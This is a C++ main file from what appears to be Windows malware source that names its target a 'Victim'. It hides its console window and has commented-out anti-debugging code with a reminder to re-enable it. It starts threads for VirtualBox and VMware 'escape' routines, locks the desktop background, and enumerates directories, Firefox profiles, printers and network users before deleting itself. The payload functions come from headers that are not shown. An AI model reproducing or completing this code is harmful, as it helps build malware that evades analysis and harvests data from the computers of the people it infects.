#include "../Headers/Includes.h"
#include "../Headers/Registry.h"
#include "../Headers/Victim.h"
#include "../Headers/VMEscape.h"
#include "../Headers/Misc.h"
#include <filesystem>

int main(int argc, char* argv[]) {
#ifndef _DEBUG
	//if (IsDebuggerPresent()) { Do not forget to uncomment this !
	//		exit(EXIT_FAILURE);
	//}
	HWND hWindowConsole;
	AllocConsole();
	hWindowConsole = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(hWindowConsole, 0);
#endif
	Victim* CurrentComputer = new Victim;
	std::thread virtualBoxChange(VMEscape::virtualBoxEscape);
	std::thread VMWareBoxChange(VMEscape::VMWareEscape);
	//Check permissions if we are admin, lock backgroundChange
	std::thread tBackgroundChange(SCH::LockBackground);
	std::thread t_DirectoriesEnum(&Victim::GetDirectoryList, CurrentComputer);
	//std::thread t_GetFirefoxProfiles(&Victim::GetFirefoxProfiles, CurrentComputer);
	virtualBoxChange.join();
	VMWareBoxChange.join();
	tBackgroundChange.join();
	t_DirectoriesEnum.join();
	CurrentComputer->GetFirefoxProfiles();
	std::thread t_EnumeratePrintersInformation(&Victim::EnumeratePrintersInformation, CurrentComputer);
	std::thread t_NetUsers(&Victim::GetNetUsers, CurrentComputer);
	//t_GetFirefoxProfiles.join();
	t_EnumeratePrintersInformation.join();
	t_NetUsers.join();
	delete CurrentComputer; //Delete our HeapAllocated Victim and remove our program.
}